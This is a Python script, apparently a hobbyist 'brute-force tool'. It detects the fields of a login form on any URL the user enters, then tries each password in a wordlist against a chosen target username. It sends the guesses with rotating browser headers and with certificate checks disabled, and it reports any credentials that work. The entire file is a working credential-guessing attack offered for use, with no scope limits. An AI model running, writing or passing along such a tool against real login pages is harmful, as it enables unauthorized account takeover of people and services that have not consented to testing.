import os
import requests
from bs4 import BeautifulSoup
from urllib.parse import urljoin

# Common field identifiers and redirect indicators
USERNAME_FIELDS = ['username', 'email', 'mail', 'user', 'login', 'phone', 'number']
PASSWORD_FIELDS = ['password', 'pass', 'pwd', 'secret', 'pwd']
SUBMIT_FIELDS = ['submit', 'login', 'signin', 'btn', 'button']
SUCCESS_INDICATORS = ['dashboard', 'account', 'welcome', 'profile', 'home']

HEADERS_LIST = [
    {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
        'Accept-Encoding': 'gzip, deflate',
        'Accept-Language': 'en-US,en;q=0.5',
        'Connection': 'keep-alive',
    },
    {
        'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.0.0 Safari/537.36',
        'Accept': '*/*',
        'Connection': 'keep-alive',
    },
]

def detect_login_fields(url):
    """
    Detect the login form fields (username, password, submit button, and form action URL).
    """
    try:
        response = requests.get(url, verify=False)
        soup = BeautifulSoup(response.text, 'html.parser')
        
        username_field = None
        password_field = None
        submit_field = None
        form_action = None
        
        # Find the form element
        form = soup.find('form')
        if form:
            form_action = form.get('action', '')
            form_action = urljoin(url, form_action)

        # Search for fields
        for input_tag in soup.find_all(['input', 'button']):
            input_name = input_tag.get('name', '').lower()
            input_id = input_tag.get('id', '').lower()
            input_type = input_tag.get('type', '').lower()
            
            # Prioritize 'name' attribute over 'id' for form submission
            if not username_field:
                for identifier in USERNAME_FIELDS:
                    if identifier in input_name:
                        username_field = input_tag.get('name')
                        break
                if not username_field:  # Fallback to check 'id'
                    for identifier in USERNAME_FIELDS:
                        if identifier in input_id:
                            username_field = input_tag.get('name') or input_tag.get('id')
                            break

            if not password_field and input_type == 'password':
                for identifier in PASSWORD_FIELDS:
                    if identifier in input_name:
                        password_field = input_tag.get('name')
                        break
                if not password_field:  # Fallback to check 'id'
                    for identifier in PASSWORD_FIELDS:
                        if identifier in input_id:
                            password_field = input_tag.get('name') or input_tag.get('id')
                            break

            # Detect submit button by type or button text
            if not submit_field and (input_type == 'submit' or input_tag.name == 'button'):
                submit_value = input_tag.get('value', '').lower()
                button_text = input_tag.text.strip().lower()
                for identifier in SUBMIT_FIELDS:
                    if identifier in input_name or identifier in input_id or identifier in submit_value or identifier in button_text:
                        submit_field = input_tag.get('name') or input_tag.get('value') or input_tag.text.strip()
                        break

        return username_field, password_field, submit_field, form_action
    
    except Exception as e:
        print(f"Error detecting fields: {e}")
        return None, None, None, None


def try_requests(url, payload, headers_list, method="POST"):
    """
    Try multiple headers and methods to send the request and find what works.
    """
    for headers in headers_list:
        try:
            response = requests.request(method, url, data=payload, headers=headers, verify=False, allow_redirects=True)
            if response.status_code in [200, 302]:  # Success or redirection
                return response
        except Exception as e:
            print(f"Error with headers {headers['User-Agent']}: {e}")
    return None

def brute_force_login(url, username_field, password_field, submit_field, form_action, username, wordlist):
    """
    Perform a brute-force login attack using the provided wordlist.
    """
    if not os.path.isfile(wordlist):
        print("Error: Wordlist file not found!")
        return False

    print(f"\n[+] Starting brute-force attack on {url}")
    print(f"[+] Target username: {username}")
    print(f"[+] Using wordlist: {wordlist}")
    print("Press Ctrl+C to stop the process\n")

    try:
        with open(wordlist, 'r', encoding='utf-8', errors='ignore') as f:
            passwords = [line.strip() for line in f]  # Strip whitespace and newlines

        for password in passwords:
            print(f"Trying password: {password}", end='\r')
            
            # Prepare the payload
            payload = {
                username_field: username,
                password_field: password
            }
            if submit_field:
                payload[submit_field] = 'Submit'

            # Try multiple headers and methods
            response = try_requests(form_action, payload, HEADERS_LIST, method="POST")
            
            if response:
                # Commented these two lines. You can use this for debugging if you want.
                # print(f"\nResponse Status Code: {response.status_code}")
                # print(f"Response Text: {response.text}")        
                
                # Check for success indicators in the response
                if any(indicator in response.text.lower() for indicator in SUCCESS_INDICATORS):
                    print(f"\n[+] Success! Valid credentials found: {username}:{password}")
                    return True
                # Also check for redirects to success pages
                elif response.history and any(indicator in response.url.lower() for indicator in SUCCESS_INDICATORS):
                    print(f"\n[+] Success! Valid credentials found: {username}:{password}")
                    return True

        print("\n[-] Password not found in wordlist")
        return False

    except KeyboardInterrupt:
        print("\n[!] Brute-force attack interrupted by user.")
        return False


def main():
    print("""
    ***************************************
    #       Python Brute-Force Tool       #
    #           by RahulHackz             #
    ***************************************
    """)
    
    # Main workflow
    url = input("\nEnter login page URL: ").strip()
    username = input("Enter target username: ").strip()
    wordlist = input("Enter path to password wordlist: ").strip()
    
    print("\n[+] Detecting login form fields...")
    username_field, password_field, submit_field, form_action = detect_login_fields(url)
    
    if not username_field or not password_field:
        print("Failed to detect login fields automatically")
        username_field = input("Enter username field name manually: ").strip()
        password_field = input("Enter password field name manually: ").strip()
    
    if not submit_field:
        print("Failed to detect submit button automatically")
        submit_field = input("Enter submit button name manually (leave blank if none): ").strip() or None

    if not form_action:
        form_action = url  # Fallback to the original URL if no form action is found

    print(f"\n[+] Detected fields - Username: {username_field}, Password: {password_field}")
    if submit_field:
        print(f"[+] Submit button: {submit_field}")
    print(f"[+] Form action URL: {form_action}")
    
    # Start brute-forcing
    success = brute_force_login(url, username_field, password_field, submit_field, form_action, username, wordlist)
    
    if success:
        print("\n[+] Attack successful! Valid credentials found.")
    else:
        print("\n[-] Attack unsuccessful. No valid credentials found.")

if __name__ == "__main__":
    main()
